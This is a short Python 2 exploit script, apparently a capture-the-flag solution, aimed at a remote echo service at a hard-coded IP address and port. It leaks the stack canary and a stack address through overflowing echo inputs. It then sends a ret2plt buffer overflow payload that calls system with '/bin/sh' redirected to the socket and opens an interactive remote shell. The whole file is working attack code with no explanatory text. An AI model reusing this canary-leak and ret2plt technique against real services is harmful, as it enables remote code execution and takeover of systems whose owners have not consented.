# -*- coding: utf-8 -*-
from m1z0r3 import *

# ip = "localhost"
# port = 8181
ip = "110.10.212.130"
port = 8889

def echo(buf):
  read_until(f,">")
  s.send("1\n")
  read_until(f,":")
  s.send(buf)

def rev_echo(buf):
  read_until(f,">")
  s.send("2\n")
  read_until(f,":")
  s.send(buf)

def exit():
  read_until(f,">")
  s.send("3\n")

# Leak canary
s,f = sock(ip,port)
buf = "A"*41
echo(buf)
canary = read_until(f)[42:46]
canary = (u32(canary) & 0x00FFFFFF) << 8
print "[+] canary %08x" % canary
exit()
s.close()

# Leak address
s,f = sock(ip,port)
buf = "A"*64
echo(buf)
addr = read_until(f)[65:69]
addr = u32(addr)
offset = 0xbfb622a4 - 0xbfb62254
arg_addr = addr - offset
print "[+] arg addr %08x" % arg_addr
exit()
s.close()

system_addr = 0x8048620
# ret2plt
s,f = sock(ip,port)
buf = "A"*40
buf += p32(canary)
buf += "A"*(56-len(buf))
buf += p32(system_addr)
buf += "AAAA"
arg_addr += len(buf) + 4
buf += p32(arg_addr)
buf += "/bin/sh >&4 <&4\x00"

echo(buf)
print "[+] exit"
exit()
shell(s)
